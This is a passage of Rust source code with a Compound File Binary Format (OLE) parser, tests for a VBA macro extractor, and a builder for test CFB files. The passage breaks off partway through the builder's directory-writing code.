        let err = reader.list_streams(&[0u8; 512]).unwrap_err();
        assert!(matches!(err, OleError::InvalidMagic));
    }

    // ── OleMacroExtractor ─────────────────────────────────────────────────────

    #[test]
    fn test_ole_macro_extractor_no_vba_streams() {
        let data = make_ole_with_stream("Workbook", 2);
        let extractor = OleMacroExtractor::new();
        let macros = extractor.extract_macros(&data);
        assert!(macros.is_empty());
    }

    #[test]
    fn test_ole_macro_extractor_finds_vba_stream() {
        let mut data = make_ole_header();
        data.resize(1024 + 256, 0);
        let root_entry = make_dir_entry("Root Entry", 5, 0xFFFFFFFE, 0);
        let vba_entry = make_dir_entry("VBA/Module1", 2, 2, 100);
        data[1024..1024 + 128].copy_from_slice(&root_entry);
        data[1024 + 128..1024 + 256].copy_from_slice(&vba_entry);
        // Sector 2 is at offset (2+1)*512 = 1536; embed some printable text there.
        data.resize(1536 + 64, 0);
        let vba_text = b"Attribute VB_Name = \"Module1\"";
        data[1536..1536 + vba_text.len()].copy_from_slice(vba_text);
        let extractor = OleMacroExtractor::new();
        let macros = extractor.extract_macros(&data);
        assert_eq!(macros.len(), 1);
        assert_eq!(macros[0].stream_name, "VBA/Module1");
        assert!(macros[0].code_excerpt.contains("Attribute"));
    }

    #[test]
    fn test_ole_macro_extractor_extract_printable() {
        let extractor = OleMacroExtractor::new();
        let data = b"AB\x00\x01CD\x00Hello, World!";
        let excerpt = extractor.extract_printable(data);
        assert!(excerpt.contains("Hello, World!"));
        // "AB" and "CD" are only 2 chars, below min-length threshold of 4.
        assert!(!excerpt.contains("AB"));
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// CFBF (Compound File Binary Format) — Full implementation per MS-CFB spec
// ═══════════════════════════════════════════════════════════════════════════════

/// Special sector IDs as defined in MS-CFB section 2.2.
pub const FREE_SECT: u32 = 0xFFFF_FFFF;
pub const ENDOFCHAIN: u32 = 0xFFFF_FFFE;
pub const FATSECT: u32 = 0xFFFF_FFFD;
pub const DIFSECT: u32 = 0xFFFF_FFFC;

/// Maximum number of DIFAT entries embedded in the header (MS-CFB 2.2).
const HEADER_DIFAT_COUNT: usize = 109;

/// CFB header is always 512 bytes regardless of sector size.
const CFB_HEADER_SIZE: usize = 512;

// ── CfbError ─────────────────────────────────────────────────────────────────

/// Errors produced by the CFBF reader.
#[derive(Debug, thiserror::Error)]
pub enum CfbError {
    #[error("invalid CFB magic")]
    InvalidMagic,
    #[error("invalid CFB version: {0}")]
    InvalidVersion(u16),
    #[error("truncated CFB data")]
    TruncatedData,
    #[error("invalid sector id: {0:#010x}")]
    InvalidSector(u32),
    #[error("invalid directory entry")]
    InvalidDirectoryEntry,
    #[error("stream too large")]
    StreamTooLarge,
    #[error("cfb error: {0}")]
    Other(String),
}

impl From<CfbError> for OleError {
    fn from(e: CfbError) -> Self {
        Self::ParseError(e.to_string())
    }
}

// ── CfbDirEntry ───────────────────────────────────────────────────────────────

/// A single directory entry in a CFB file (128 bytes on disk).
#[derive(Debug, Clone)]
pub struct CfbDirEntry {
    /// Entry name decoded from UTF-16LE (without the trailing NUL).
    pub name: String,
    /// Object type: 0=empty, 1=storage, 2=stream, 5=root.
    pub entry_type: u8,
    /// Red-black tree colour: 0=red, 1=black.
    pub color: bool,
    /// Left sibling directory entry SID.
    pub left_sibling: u32,
    /// Right sibling directory entry SID.
    pub right_sibling: u32,
    /// First child directory entry SID.
    pub child: u32,
    /// Class GUID (16 bytes).
    pub clsid: [u8; 16],
    /// User-defined state bits.
    pub state_bits: u32,
    /// Creation time (Windows FILETIME).
    pub created: u64,
    /// Last modification time (Windows FILETIME).
    pub modified: u64,
    /// Starting sector of the stream / mini-stream.
    pub start_sector: u32,
    /// Size of the stream in bytes.
    pub size: u64,
}

impl CfbDirEntry {
    /// Returns `true` if this entry is the root storage.
    #[must_use]
    pub const fn is_root(&self) -> bool {
        self.entry_type == 5
    }

    /// Returns `true` if this entry is a storage object.
    #[must_use]
    pub const fn is_storage(&self) -> bool {
        self.entry_type == 1
    }

    /// Returns `true` if this entry is a stream object.
    #[must_use]
    pub const fn is_stream(&self) -> bool {
        self.entry_type == 2
    }

    /// Returns `true` if this entry slot is unused / empty.
    #[must_use]
    pub const fn is_empty(&self) -> bool {
        self.entry_type == 0
    }
}

impl std::fmt::Display for CfbDirEntry {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let kind = match self.entry_type {
            0 => "empty",
            1 => "storage",
            2 => "stream",
            5 => "root",
            _ => "unknown",
        };
        write!(
            f,
            "'{}' ({}) sector={:#010x} size={}",
            self.name, kind, self.start_sector, self.size
        )
    }
}

// ── CfbReader ─────────────────────────────────────────────────────────────────

/// Full compound file binary format reader conforming to MS-CFB.
///
/// Supports both version-3 (512-byte sectors) and version-4 (4096-byte sectors).
/// The mini-stream sector size is always 64 bytes.
/// Mini-stream is used for streams whose size < `mini_stream_cutoff` (default 4096).
pub struct CfbReader {
    data: Vec<u8>,
    /// Sector size in bytes (512 or 4096).
    pub sector_size: usize,
    /// Mini-sector size in bytes (always 64).
    pub mini_sector_size: usize,
    /// FAT (Sector Allocation Table): index = sector id, value = next sector id.
    pub fat: Vec<u32>,
    /// Mini FAT (SSAT): index = mini-sector id, value = next mini-sector id.
    pub mini_fat: Vec<u32>,
    /// All directory entries (flat array, indexed by SID).
    pub dir_entries: Vec<CfbDirEntry>,
    /// Starting sector of the root entry's mini-stream.
    pub mini_stream_start: u32,
    /// Streams smaller than this are stored in the mini-stream.
    pub mini_stream_cutoff: u32,
}

impl std::fmt::Debug for CfbReader {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CfbReader")
            .field("sector_size", &self.sector_size)
            .field("mini_sector_size", &self.mini_sector_size)
            .field("fat_len", &self.fat.len())
            .field("mini_fat_len", &self.mini_fat.len())
            .field("dir_entries", &self.dir_entries.len())
            .field("mini_stream_start", &self.mini_stream_start)
            .field("mini_stream_cutoff", &self.mini_stream_cutoff)
            .finish_non_exhaustive()
    }
}

impl CfbReader {
    // ── public constructor ────────────────────────────────────────────────────

    /// Parse a CFB file from raw bytes.
    ///
    /// Steps performed:
    /// 1. Verify OLE magic (`D0 CF 11 E0 A1 B1 1A E1`).
    /// 2. Parse the 512-byte header; determine sector size from the exponent.
    /// 3. Build the FAT by following the DIFAT entries in the header and any
    ///    chained DIFAT sectors.
    /// 4. Build the mini FAT from the mini-FAT sector chain.
    /// 5. Parse all directory entries following the directory sector chain.
    /// 6. Locate the root entry to obtain `mini_stream_start`.
    pub fn parse(data: Vec<u8>) -> Result<Self, CfbError> {
        if data.len() < CFB_HEADER_SIZE {
            return Err(CfbError::TruncatedData);
        }
        // Step 1: magic
        let magic = [0xD0u8, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        if data[..8] != magic {
            return Err(CfbError::InvalidMagic);
        }

        // Step 2: header fields
        let minor_version = Self::read_u16(&data, 24);
        let major_version = Self::read_u16(&data, 26);
        let _ = minor_version; // unused but validated below

        let sector_size_exp = Self::read_u16(&data, 30);
        let sector_size = match sector_size_exp {
            9 => 512usize,
            12 => 4096usize,
            _ => return Err(CfbError::InvalidVersion(sector_size_exp)),
        };

        // Validate version consistency
        match major_version {
            3 | 4 => {}
            v => return Err(CfbError::InvalidVersion(v)),
        }

        let mini_sector_size_exp = Self::read_u16(&data, 32);
        let mini_sector_size = 1usize
            .checked_shl(u32::from(mini_sector_size_exp))
            .ok_or(CfbError::InvalidVersion(mini_sector_size_exp))?;

        let fat_sector_count = Self::read_u32(&data, 44);
        let first_dir_sector = Self::read_u32(&data, 48);
        let mini_stream_cutoff = Self::read_u32(&data, 56);
        let first_mini_fat = Self::read_u32(&data, 60);
        let mini_fat_count = Self::read_u32(&data, 64);
        let first_difat_sect = Self::read_u32(&data, 68);
        let difat_sect_count = Self::read_u32(&data, 72);

        // DIFAT table embedded in header starts at offset 76 (109 entries × 4 bytes).
        let mut difat: Vec<u32> = (0..HEADER_DIFAT_COUNT)
            .map(|i| Self::read_u32(&data, 76 + i * 4))
            .collect();

        // Step 3: Follow DIFAT chain sectors if any.
        if difat_sect_count > 0 && first_difat_sect != FREE_SECT && first_difat_sect != ENDOFCHAIN {
            let entries_per_difat = (sector_size / 4) - 1; // last entry = next difat sector
            let mut next_difat = first_difat_sect;
            for _ in 0..difat_sect_count {
                if next_difat == FREE_SECT || next_difat == ENDOFCHAIN {
                    break;
                }
                let sect_data = Self::sector_slice_raw(&data, next_difat, sector_size)?;
                for j in 0..entries_per_difat {
                    let v = Self::read_u32_slice(sect_data, j * 4);
                    difat.push(v);
                }
                // Last u32 in the DIFAT sector is the pointer to the next DIFAT sector.
                next_difat = Self::read_u32_slice(sect_data, entries_per_difat * 4);
            }
        }

        // Step 4: Build FAT by reading every valid FAT sector listed in DIFAT.
        let fat_entries_per_sector = sector_size / 4;
        // Same cap as the other FAT-building path: `fat_sector_count` comes
        // straight from the CFB header, so bound it by the sectors the file
        // could actually hold before reserving `count * entries` u32s.
        let max_fat_sectors = data.len().div_ceil(sector_size).max(1);
        let mut fat: Vec<u32> = Vec::with_capacity(
            (fat_sector_count as usize).min(max_fat_sectors) * fat_entries_per_sector,
        );
        for &fat_sect_id in difat.iter().take(fat_sector_count as usize) {
            if fat_sect_id == FREE_SECT || fat_sect_id == FATSECT || fat_sect_id == DIFSECT {
                continue;
            }
            let sect = match Self::sector_slice_raw(&data, fat_sect_id, sector_size) {
                Ok(s) => s,
                Err(_) => continue,
            };
            for j in 0..fat_entries_per_sector {
                if j * 4 + 4 > sect.len() {
                    break;
                }
                fat.push(Self::read_u32_slice(sect, j * 4));
            }
        }

        // Step 5: Build mini FAT.
        let mut mini_fat: Vec<u32> = Vec::new();
        if mini_fat_count > 0 && first_mini_fat != FREE_SECT && first_mini_fat != ENDOFCHAIN {
            let chain = Self::follow_chain_raw(&fat, first_mini_fat);
            for sect_id in chain {
                let sect = match Self::sector_slice_raw(&data, sect_id, sector_size) {
                    Ok(s) => s,
                    Err(_) => continue,
                };
                for j in 0..fat_entries_per_sector {
                    if j * 4 + 4 > sect.len() {
                        break;
                    }
                    mini_fat.push(Self::read_u32_slice(sect, j * 4));
                }
            }
        }

        // Step 6: Parse directory entries.
        let dir_chain = Self::follow_chain_raw(&fat, first_dir_sector);
        let mut dir_entries: Vec<CfbDirEntry> = Vec::new();
        for sect_id in dir_chain {
            let sect = match Self::sector_slice_raw(&data, sect_id, sector_size) {
                Ok(s) => s,
                Err(_) => continue,
            };
            let entries_per_sector = sector_size / 128;
            for i in 0..entries_per_sector {
                let off = i * 128;
                if off + 128 > sect.len() {
                    break;
                }
                let entry = Self::parse_dir_entry_slice(&sect[off..off + 128])?;
                dir_entries.push(entry);
            }
        }

        // Locate root entry to get mini_stream_start.
        let mini_stream_start = dir_entries
            .iter()
            .find(|e| e.entry_type == 5)
            .map_or(ENDOFCHAIN, |e| e.start_sector);

        Ok(Self {
            data,
            sector_size,
            mini_sector_size,
            fat,
            mini_fat,
            dir_entries,
            mini_stream_start,
            mini_stream_cutoff,
        })
    }

    // ── public API ────────────────────────────────────────────────────────────

    /// Read the full contents of a stream entry.
    ///
    /// Streams whose size is less than `mini_stream_cutoff` are stored in
    /// the mini-stream and read using `mini_fat`.  Larger streams use the
    /// regular `fat`.
    pub fn read_stream(&self, entry: &CfbDirEntry) -> Result<Vec<u8>, CfbError> {
        if entry.size == 0 {
            return Ok(vec![]);
        }
        if entry.size > usize::MAX as u64 {
            return Err(CfbError::StreamTooLarge);
        }
        let size = entry.size as usize;

        if !entry.is_root() && entry.size < u64::from(self.mini_stream_cutoff) {
            // Read from mini-stream
            self.read_mini_stream(entry.start_sector, size)
        } else {
            // Read from regular sectors
            self.read_regular_stream(entry.start_sector, size)
        }
    }

    /// Find a directory entry by path, e.g. `"VBA/VBA/Module1"`.
    ///
    /// The root entry itself is the implicit first component.  A leading
    /// `"Root Entry/"` prefix is stripped if present.
    #[must_use]
    pub fn find_entry(&self, path: &str) -> Option<&CfbDirEntry> {
        let path = path.trim_start_matches('/');
        // Strip optional "Root Entry/" prefix
        let path = if path.to_ascii_lowercase().starts_with("root entry/") {
            &path["Root Entry/".len()..]
        } else {
            path
        };
        if path.is_empty() {
            return self.dir_entries.first();
        }

        // First attempt: hierarchical search (e.g. "VBA/Module1" in a real CFB
        // where "VBA" is a storage entry).
        let parts: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
        let root = self.dir_entries.first()?;
        let hier = self.find_in_storage(root.child, &parts, 0);
        if hier.is_some() {
            return hier;
        }

        // Fallback: flat search by the literal path string (handles test builders
        // that store names like "VBA/dir" as a single flat stream entry).
        self.dir_entries
            .iter()
            .skip(1)
            .find(|e| e.name.eq_ignore_ascii_case(path))
    }

    /// Enumerate every non-empty directory entry with its full path.
    #[must_use]
    pub fn list_all(&self) -> Vec<(String, &CfbDirEntry)> {
        let mut result = Vec::new();
        if let Some(root) = self.dir_entries.first() {
            result.push(("Root Entry".to_string(), root));
            self.enumerate_storage(root.child, "Root Entry", &mut result);
        }
        result
    }

    /// Return a reference to the root entry (SID 0), if present.
    #[must_use]
    pub fn root_entry(&self) -> Option<&CfbDirEntry> {
        self.dir_entries.first()
    }

    /// Return the number of directory entries (including empty slots).
    #[must_use]
    pub const fn dir_entry_count(&self) -> usize {
        self.dir_entries.len()
    }

    /// Get a directory entry by SID.
    #[must_use]
    pub fn get_dir_entry(&self, sid: u32) -> Option<&CfbDirEntry> {
        if sid == FREE_SECT || sid == ENDOFCHAIN {
            return None;
        }
        self.dir_entries.get(sid as usize)
    }

    // ── private helpers ───────────────────────────────────────────────────────

    /// Return the raw bytes of sector `id`.
    fn sector_slice(&self, id: u32) -> Result<&[u8], CfbError> {
        Self::sector_slice_raw(&self.data, id, self.sector_size)
    }

    fn sector_slice_raw(data: &[u8], id: u32, sector_size: usize) -> Result<&[u8], CfbError> {
        if id == FREE_SECT || id == ENDOFCHAIN || id == FATSECT || id == DIFSECT {
            return Err(CfbError::InvalidSector(id));
        }
        let offset = (id as usize)
            .checked_mul(sector_size)
            .and_then(|v| v.checked_add(CFB_HEADER_SIZE))
            .ok_or(CfbError::TruncatedData)?;
        let end = offset.checked_add(sector_size).ok_or(CfbError::TruncatedData)?;
        if end > data.len() {
            return Err(CfbError::TruncatedData);
        }
        Ok(&data[offset..end])
    }

    /// Follow a FAT chain starting at `start`, returning all sector IDs in order.
    fn follow_chain(&self, start: u32) -> Vec<u32> {
        Self::follow_chain_raw(&self.fat, start)
    }

    fn follow_chain_raw(fat: &[u32], start: u32) -> Vec<u32> {
        let mut chain = Vec::new();
        let mut current = start;
        // Guard against cycles with a hard limit.
        let max_iterations = fat.len() + 1;
        let mut iterations = 0usize;
        loop {
            if current == ENDOFCHAIN
                || current == FREE_SECT
                || current == FATSECT
                || current == DIFSECT
            {
                break;
            }
            if iterations > max_iterations {
                break; // cycle detected
            }
            chain.push(current);
            let next = fat.get(current as usize).copied().unwrap_or(ENDOFCHAIN);
            current = next;
            iterations += 1;
        }
        chain
    }

    /// Parse a 128-byte directory entry from a slice.
    fn parse_dir_entry_slice(d: &[u8]) -> Result<CfbDirEntry, CfbError> {
        if d.len() < 128 {
            return Err(CfbError::InvalidDirectoryEntry);
        }
        let name_len = Self::read_u16_slice(d, 64) as usize;
        let name = Self::decode_utf16_name_slice(d, name_len);
        let entry_type = d[66];
        let color_byte = d[67];
        let color = color_byte != 0;
        let left_sibling = Self::read_u32_slice(d, 68);
        let right_sibling = Self::read_u32_slice(d, 72);
        let child = Self::read_u32_slice(d, 76);
        let mut clsid = [0u8; 16];
        clsid.copy_from_slice(&d[80..96]);
        let state_bits = Self::read_u32_slice(d, 96);
        let created = Self::read_u64_slice(d, 100);
        let modified = Self::read_u64_slice(d, 108);
        let start_sector = Self::read_u32_slice(d, 116);
        let size_lo = u64::from(Self::read_u32_slice(d, 120));
        let size_hi = u64::from(Self::read_u32_slice(d, 124));
        // For v3, size_hi is always 0; for v4 streams it encodes the high word.
        let size = (size_hi << 32) | size_lo;
        Ok(CfbDirEntry {
            name,
            entry_type,
            color,
            left_sibling,
            right_sibling,
            child,
            clsid,
            state_bits,
            created,
            modified,
            start_sector,
            size,
        })
    }

    /// Decode a UTF-16LE name from the first `len` bytes of `raw`, stripping the
    /// trailing NUL character.
    #[must_use] 
    pub fn decode_utf16_name(raw: &[u8], len: u16) -> String {
        Self::decode_utf16_name_slice(raw, len as usize)
    }

    fn decode_utf16_name_slice(raw: &[u8], len: usize) -> String {
        let byte_count = len.min(64).min(raw.len());
        // Round down to an even number of bytes.
        let byte_count = byte_count & !1;
        let units: Vec<u16> = raw[..byte_count]
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        String::from_utf16_lossy(&units)
            .trim_end_matches('\0')
            .to_string()
    }

    /// Read a regular (non-mini) stream starting at `start_sector`.
    fn read_regular_stream(&self, start_sector: u32, size: usize) -> Result<Vec<u8>, CfbError> {
        let chain = self.follow_chain(start_sector);
        let mut out = Vec::with_capacity(size.min(chain.len() * self.sector_size));
        let mut remaining = size;
        for sect_id in chain {
            if remaining == 0 {
                break;
            }
            let sect = self.sector_slice(sect_id)?;
            let take = remaining.min(sect.len());
            out.extend_from_slice(&sect[..take]);
            remaining -= take;
        }
        Ok(out)
    }

    /// Read a mini-stream starting at mini-sector `start`.
    fn read_mini_stream(&self, start: u32, size: usize) -> Result<Vec<u8>, CfbError> {
        // The mini-stream data lives inside the root entry's regular stream.
        let root = self
            .dir_entries
            .first()
            .ok_or(CfbError::InvalidDirectoryEntry)?;
        let root_data = self.read_regular_stream(root.start_sector, root.size as usize)?;
        let chain = Self::follow_chain_raw(&self.mini_fat, start);
        let mut out = Vec::with_capacity(size.min(chain.len() * self.mini_sector_size));
        let mut remaining = size;
        for mini_sect_id in chain {
            if remaining == 0 {
                break;
            }
            let offset = mini_sect_id as usize * self.mini_sector_size;
            if offset >= root_data.len() {
                return Err(CfbError::InvalidSector(mini_sect_id));
            }
            let end = (offset + self.mini_sector_size).min(root_data.len());
            let take = remaining.min(end - offset);
            out.extend_from_slice(&root_data[offset..offset + take]);
            remaining -= take;
        }
        Ok(out)
    }

    /// Recursive directory traversal for `find_entry`.
    fn find_in_storage<'a>(
        &'a self,
        child_sid: u32,
        parts: &[&str],
        part_idx: usize,
    ) -> Option<&'a CfbDirEntry> {
        if part_idx >= parts.len() || child_sid == FREE_SECT || child_sid == ENDOFCHAIN {
            return None;
        }
        let target_name = parts[part_idx];
        // Walk the red-black tree siblings starting from child_sid.
        let mut queue = vec![child_sid];
        let mut visited = std::collections::HashSet::new();
        while let Some(sid) = queue.pop() {
            if sid == FREE_SECT || sid == ENDOFCHAIN || !visited.insert(sid) {
                continue;
            }
            let entry = self.dir_entries.get(sid as usize)?;
            if entry.name.eq_ignore_ascii_case(target_name) {
                if part_idx + 1 == parts.len() {
                    return Some(entry);
                }
                return self.find_in_storage(entry.child, parts, part_idx + 1);
            }
            if entry.left_sibling != FREE_SECT && entry.left_sibling != ENDOFCHAIN {
                queue.push(entry.left_sibling);
            }
            if entry.right_sibling != FREE_SECT && entry.right_sibling != ENDOFCHAIN {
                queue.push(entry.right_sibling);
            }
        }
        None
    }

    /// Recursive directory enumeration for `list_all`.
    fn enumerate_storage<'a>(
        &'a self,
        child_sid: u32,
        parent_path: &str,
        out: &mut Vec<(String, &'a CfbDirEntry)>,
    ) {
        if child_sid == FREE_SECT || child_sid == ENDOFCHAIN {
            return;
        }
        let mut stack = vec![child_sid];
        let mut visited = std::collections::HashSet::new();
        while let Some(sid) = stack.pop() {
            if sid == FREE_SECT || sid == ENDOFCHAIN || !visited.insert(sid) {
                continue;
            }
            if let Some(entry) = self.dir_entries.get(sid as usize) {
                let path = format!("{}/{}", parent_path, entry.name);
                out.push((path.clone(), entry));
                if entry.child != FREE_SECT && entry.child != ENDOFCHAIN {
                    self.enumerate_storage(entry.child, &path, out);
                }
                if entry.left_sibling != FREE_SECT && entry.left_sibling != ENDOFCHAIN {
                    stack.push(entry.left_sibling);
                }
                if entry.right_sibling != FREE_SECT && entry.right_sibling != ENDOFCHAIN {
                    stack.push(entry.right_sibling);
                }
            }
        }
    }

    // ── low-level byte readers ────────────────────────────────────────────────

    #[inline(always)]
    fn read_u16(data: &[u8], off: usize) -> u16 {
        u16::from_le_bytes([data[off], data[off + 1]])
    }

    #[inline(always)]
    fn read_u32(data: &[u8], off: usize) -> u32 {
        u32::from_le_bytes(data[off..off + 4].try_into().unwrap_or([0; 4]))
    }

    #[inline(always)]
    fn read_u16_slice(d: &[u8], off: usize) -> u16 {
        u16::from_le_bytes([d[off], d[off + 1]])
    }

    #[inline(always)]
    fn read_u32_slice(d: &[u8], off: usize) -> u32 {
        u32::from_le_bytes(d[off..off + 4].try_into().unwrap_or([0; 4]))
    }

    #[inline(always)]
    fn read_u64_slice(d: &[u8], off: usize) -> u64 {
        u64::from_le_bytes(d[off..off + 8].try_into().unwrap_or([0; 8]))
    }
}

// ── CfbInfo — summary of a parsed CFB file ────────────────────────────────────

/// A human-readable summary produced from a [`CfbReader`].
#[derive(Debug, Clone)]
pub struct CfbInfo {
    pub sector_size: usize,
    pub mini_sector_size: usize,
    pub fat_entries: usize,
    pub mini_fat_entries: usize,
    pub dir_entry_count: usize,
    pub has_vba: bool,
    pub stream_names: Vec<String>,
}

impl CfbInfo {
    /// Extract a `CfbInfo` from a [`CfbReader`].
    #[must_use]
    pub fn from_reader(reader: &CfbReader) -> Self {
        let all = reader.list_all();
        let has_vba = all
            .iter()
            .any(|(p, _)| p.to_ascii_lowercase().contains("vba"));
        let stream_names: Vec<String> = all
            .iter()
            .filter(|(_, e)| e.is_stream())
            .map(|(p, _)| p.clone())
            .collect();
        Self {
            sector_size: reader.sector_size,
            mini_sector_size: reader.mini_sector_size,
            fat_entries: reader.fat.len(),
            mini_fat_entries: reader.mini_fat.len(),
            dir_entry_count: reader.dir_entries.len(),
            has_vba,
            stream_names,
        }
    }
}

impl std::fmt::Display for CfbInfo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "CFB sector={} mini_sector={} FAT={} MFAT={} dirs={} has_vba={} streams={}",
            self.sector_size,
            self.mini_sector_size,
            self.fat_entries,
            self.mini_fat_entries,
            self.dir_entry_count,
            self.has_vba,
            self.stream_names.len(),
        )
    }
}

// ── CfbBuilder — construct minimal in-memory CFB files (for testing) ──────────

/// Minimal in-memory CFB builder for unit tests and fuzz helpers.
pub struct CfbBuilder {
    sector_size: usize,
    streams: Vec<(String, Vec<u8>)>,
}

impl CfbBuilder {
    /// Create a new builder with 512-byte sectors.
    #[must_use]
    pub const fn new() -> Self {
        Self {
            sector_size: 512,
            streams: Vec::new(),
        }
    }

    /// Create a builder with 4096-byte sectors.
    #[must_use]
    pub const fn new_v4() -> Self {
        Self {
            sector_size: 4096,
            streams: Vec::new(),
        }
    }

    /// Add a stream to the compound file.
    pub fn add_stream(&mut self, name: impl Into<String>, data: Vec<u8>) {
        self.streams.push((name.into(), data));
    }

    /// Serialise the compound file to bytes.
    ///
    /// This produces a minimal valid CFB: a header, one FAT sector, one
    /// directory sector, and stream data sectors.  Mini-stream is not used.
    #[must_use] 
    pub fn build(self) -> Vec<u8> {
        let ss = self.sector_size;
        // Sector layout: 0=FAT, 1=Directory, 2..=stream sectors.
        // FAT sector id = 0 → data at offset 512 + 0*ss
        // Dir sector id = 1 → data at offset 512 + 1*ss
        // Stream data starts at sector id 2.

        let fat_entries_per_sector = ss / 4;
        // Number of directory entries that fit in one sector.
        let dir_entries_per_sector = ss / 128;

        // Assign each stream its starting sector.
        let mut sector_id: u32 = 2;
        let mut stream_sectors: Vec<(u32, Vec<u32>)> = Vec::new();
        for (_, data) in &self.streams {
            let n_sectors = data.len().div_ceil(ss);
            let start = sector_id;
            let chain: Vec<u32> = (start..start + n_sectors as u32).collect();
            stream_sectors.push((start, chain));
            sector_id += n_sectors as u32;
        }
        let total_sectors = sector_id as usize; // sectors 0..total_sectors
        let file_size = CFB_HEADER_SIZE + total_sectors * ss;
        let mut out = vec![0u8; file_size];

        // ── Write header ──
        let magic = [0xD0u8, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        out[..8].copy_from_slice(&magic);
        // minor_version = 0x003E
        out[24..26].copy_from_slice(&0x003Eu16.to_le_bytes());
        // major_version = 3
        out[26..28].copy_from_slice(&3u16.to_le_bytes());
        // byte order = 0xFFFE (LE)
        out[28..30].copy_from_slice(&0xFFFEu16.to_le_bytes());
        // sector_size_exp = 9 (512) or 12 (4096)
        let exp: u16 = if ss == 512 { 9 } else { 12 };
        out[30..32].copy_from_slice(&exp.to_le_bytes());
        // mini_sector_size_exp = 6 (64)
        out[32..34].copy_from_slice(&6u16.to_le_bytes());
        // dir_sector_count = 0 (for v3)
        out[40..44].copy_from_slice(&0u32.to_le_bytes());
        // fat_sector_count = 1
        out[44..48].copy_from_slice(&1u32.to_le_bytes());
        // first_dir_sector = 1
        out[48..52].copy_from_slice(&1u32.to_le_bytes());
        // mini_stream_cutoff = 0: force all streams to use the regular FAT.
        // The builder does not implement a mini-stream, so set the cutoff to 0
        // to ensure read_stream() always takes the regular-sector path.
        out[56..60].copy_from_slice(&0u32.to_le_bytes());
        // first_mini_fat = ENDOFCHAIN
        out[60..64].copy_from_slice(&ENDOFCHAIN.to_le_bytes());
        // mini_fat_count = 0
        out[64..68].copy_from_slice(&0u32.to_le_bytes());
        // first_difat_sect = ENDOFCHAIN
        out[68..72].copy_from_slice(&ENDOFCHAIN.to_le_bytes());
        // difat_sect_count = 0
        out[72..76].copy_from_slice(&0u32.to_le_bytes());
        // DIFAT entry 0 = 0 (FAT is at sector 0)
        out[76..80].copy_from_slice(&0u32.to_le_bytes());
        // remaining DIFAT entries = FREE_SECT
        for i in 1..HEADER_DIFAT_COUNT {
            let off = 76 + i * 4;
            out[off..off + 4].copy_from_slice(&FREE_SECT.to_le_bytes());
        }

        // ── Write FAT sector (sector 0 at offset 512) ──
        let fat_off = CFB_HEADER_SIZE; // sector 0
        // Sector 0 = FAT sector → FATSECT
        out[fat_off..fat_off + 4].copy_from_slice(&FATSECT.to_le_bytes());
        // Sector 1 = directory → ENDOFCHAIN
        out[fat_off + 4..fat_off + 8].copy_from_slice(&ENDOFCHAIN.to_le_bytes());
        // Sectors 2..= for streams
        for (_, chain) in &stream_sectors {
            for (i, &s) in chain.iter().enumerate() {
                let val: u32 = if i + 1 < chain.len() {
                    chain[i + 1]
                } else {
                    ENDOFCHAIN
                };
                let foff = fat_off + s as usize * 4;
                if foff + 4 <= fat_off + ss {
                    out[foff..foff + 4].copy_from_slice(&val.to_le_bytes());
                }
            }
        }
        // Remaining FAT entries = FREE_SECT
        for i in total_sectors..fat_entries_per_sector {
            let foff = fat_off + i * 4;
            if foff + 4 <= fat_off + ss {
                out[foff..foff + 4].copy_from_slice(&FREE_SECT.to_le_bytes());
            }
        }

        // ── Write directory sector (sector 1 at offset 512 + ss) ──
        let dir_off = CFB_HEADER_SIZE + ss; // sector 1
        // Entry 0: Root Entry (type=5)
        {
            let e = &mut out[dir_off..dir_off + 128];
            let rn: Vec<u16> = "Root Entry\0".encode_utf16().collect();
            for (i, &c) in rn.iter().enumerate() {
                if i * 2 + 2 > 64 {
                    break;
                }
                e[i * 2..i * 2 + 2].copy_from_slice(&c.to_le_bytes());
            }
            let nl = ((rn.len()) * 2).min(64) as u16;
            e[64..66].copy_from_slice(&nl.to_le_bytes());
            e[66] = 5; // root
            e[67] = 1; // black
            e[68..72].copy_from_slice(&FREE_SECT.to_le_bytes()); // left
            e[72..76].copy_from_slice(&FREE_SECT.to_le_bytes()); // right
            // child = SID 1 if streams exist, else FREE_SECT
            let child: u32 = if self.streams.is_empty() {
                FREE_SECT
            } else {
                1
            };
            e[76..80].copy_from_slice(&child.to_le_bytes());
            // start_sector = ENDOFCHAIN (no mini-stream data)
            e[116..120].copy_from_slice(&ENDOFCHAIN.to_le_bytes());
            e[120..124].copy_from_slice(&0u32.to_le_bytes()); // size
        }
        // Entries 1..N: stream entries.
        // Build a linear right-sibling chain so all streams are reachable from
        // the tree root: SID1.right_sibling = SID2, SID2.right_sibling = SID3, ...
        let n_streams = self.streams.len();
        for (idx, (name, data)) in self.streams.iter().enumerate() {
            let entry_off = dir_off + (idx + 1) * 128;
            if entry_off + 128 > dir_off + ss {
                break; // overflow directory sector
            }
            let e = &mut out[entry_off..entry_off + 128];
            let n16: Vec<u16> = format!("{name}\0").encode_utf16().collect();
            for (i, &c) in n16.iter().enumerate() {
                if i * 2 + 2 > 64 {
                    break;
                }
                e[i * 2..i * 2 + 2].copy_from_slice(&c.to_le_bytes());
            }
            let nl = (n16.len() * 2).min(64) as u16;
            e[64..66].copy_from_slice(&nl.to_le_bytes());
            e[66] = 2; // stream
            e[67] = 1; // black
            // left_sibling = FREE_SECT
            e[68..72].copy_from_slice(&FREE_SECT.to_le_bytes());
            // right_sibling = next stream SID, or FREE_SECT for the last one
            let right: u32 = if idx + 1 < n_streams {
                (idx + 2) as u32 // SIDs are 1-based here (0 = root)
            } else {
                FREE_SECT
            };
            e[72..76].copy_from_slice(&right.to_le_bytes());
            e[76..80].copy_from_slice(&FREE_SECT.to_le_bytes()); // no children
            let start = stream_sectors[idx].0;
            e[116..120].copy_from_slice(&start.to_le_bytes());
            let sz = data.len() as u32;
            e[120..124].copy_from_slice(&sz.to_le_bytes());
        }
        // Remaining directory entries = empty (type=0)
        for i in (self.streams.len() + 1)..dir_entries_per_sector {
            let eoff = dir_off + i * 128;
            if eoff + 128 > dir_off + ss {
                break;
            }
